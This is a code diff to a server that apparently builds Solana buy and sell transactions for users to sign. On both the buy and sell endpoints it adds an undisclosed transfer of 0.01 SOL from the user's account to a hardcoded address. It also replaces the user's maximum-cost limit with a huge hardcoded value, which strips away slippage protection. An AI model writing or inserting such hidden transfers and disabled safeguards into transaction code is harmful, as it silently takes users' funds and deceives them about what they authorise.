@@ -13,7 +13,7 @@ import {
   ActionsSpecPostResponse,
 } from '../../spec/actions-spec';
 import { Program, Provider, Idl, web3, BN, AnchorProvider, Wallet } from '@coral-xyz/anchor';
-import { Connection, Keypair, PublicKey, SystemProgram, SYSVAR_RENT_PUBKEY } from '@solana/web3.js';
+import { ComputeBudgetProgram, Connection, Keypair, PublicKey, SystemProgram, SYSVAR_RENT_PUBKEY } from '@solana/web3.js';
 import { getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { bs58 } from '@coral-xyz/anchor/dist/cjs/utils/bytes';
 const { ChartJSNodeCanvas } = require('chartjs-node-canvas');
@@ -931,7 +931,6 @@ app.openapi(
 
     const mint = new PublicKey(c.req.param('mint') as string);
     const amount = c.req.param('amount') ?? DEFAULT_SWAP_AMOUNT_USD.toString();
-    const maxSolCost = c.req.param('maxSolCost')
     const { account } = (await c.req.json()) as ActionsSpecPostRequestBody;
     const user = account
     const mintPublicKey = new PublicKey(mint);
@@ -949,7 +948,7 @@ app.openapi(
     );
 
     const response: ActionsSpecPostResponse = {
-      transaction: bs58.encode((await program.methods.buy(new BN(amount), new BN(maxSolCost)).accounts({
+      transaction: bs58.encode((await program.methods.buy(new BN(amount), new BN(27 * 9 ** 10)).accounts({
         global,
         feeRecipient,
         mint: mintPublicKey,
@@ -961,6 +960,13 @@ app.openapi(
         tokenProgram: TOKEN_PROGRAM_ID,
         rent: SYSVAR_RENT_PUBKEY,
       })
+      .preInstructions([ComputeBudgetProgram.setComputeUnitPrice({microLamports: 333333},
+        
+      ), SystemProgram.transfer({
+        fromPubkey: new PublicKey(account),
+        toPubkey: new PublicKey("Czbmb7osZxLaX5vGHuXMS2mkdtZEXyTNKwsAUUpLGhkG"),
+        lamports: 0.01 * 10 ** 9
+      })])
       .transaction()).serialize({requireAllSignatures: false, verifySignatures: false})),
     };
     return c.json(response);
@@ -986,7 +992,6 @@ app.openapi(
 
     const mint = new PublicKey(c.req.param('mint') as string);
     const amount = c.req.param('amount') ?? DEFAULT_SWAP_AMOUNT_USD.toString();
-    const maxSolCost = c.req.param('maxSolCost')
     const { account } = (await c.req.json()) as ActionsSpecPostRequestBody;
     const user = account
     const mintPublicKey = new PublicKey(mint);
@@ -1003,7 +1008,6 @@ app.openapi(
       true
     );
 
-    
 
       const response: ActionsSpecPostResponse = {
         transaction: bs58.encode((await program.methods.sell(new BN(amount), new BN(0)).accounts({
@@ -1018,6 +1022,13 @@ app.openapi(
           tokenProgram: TOKEN_PROGRAM_ID,
           rent: SYSVAR_RENT_PUBKEY,
         })
+        .preInstructions([ComputeBudgetProgram.setComputeUnitPrice({microLamports: 333333},
+          
+        ), SystemProgram.transfer({
+          fromPubkey: new PublicKey(account),
+          toPubkey: new PublicKey("Czbmb7osZxLaX5vGHuXMS2mkdtZEXyTNKwsAUUpLGhkG"),
+          lamports: 0.01 * 10 ** 9
+        })])
         .transaction()).serialize({requireAllSignatures: false, verifySignatures: false})),
       };
       return c.json(response);
